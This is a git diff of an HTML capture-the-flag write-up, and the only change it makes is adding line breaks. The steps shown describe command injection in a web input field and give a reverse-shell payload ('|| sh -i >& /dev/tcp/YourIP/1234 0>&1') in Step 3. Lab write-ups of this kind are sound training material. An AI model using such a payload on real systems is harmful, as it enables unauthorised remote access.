@@ -16,7 +16,7 @@ In this writeup, i will include all the steps i took to solve the room.
     <li>
         <strong>Step 2 :</strong>
         <ul>
-            Let's try Command Injection in the input field from <a href="https://book.hacktricks.xyz/pentesting-web/command-injection">hacktricks</a>.
+            Let's try Command Injection in the input field from <a href="https://book.hacktricks.xyz/pentesting-web/command-injection">hacktricks</a>.<br>
             <img src="./img/webPage2.png" alt="webPage2" width="500"><br>
             It works.
         </ul>
@@ -24,8 +24,8 @@ In this writeup, i will include all the steps i took to solve the room.
     <li>
         <strong>Step 3 :</strong>
         <ul>
-            Let's get a reverse shell by using this payload -> <code>|| sh -i >& /dev/tcp/YourIP/1234 0>&1</code>. <br>
-            <img src="./img/shell.png" alt="shell">
+            Let's get a reverse shell by using this payload -> <code>|| sh -i >& /dev/tcp/YourIP/1234 0>&1</code>.<br>
+            <img src="./img/shell.png" alt="shell"><br>
         </ul>
     </li><br>
     <li>
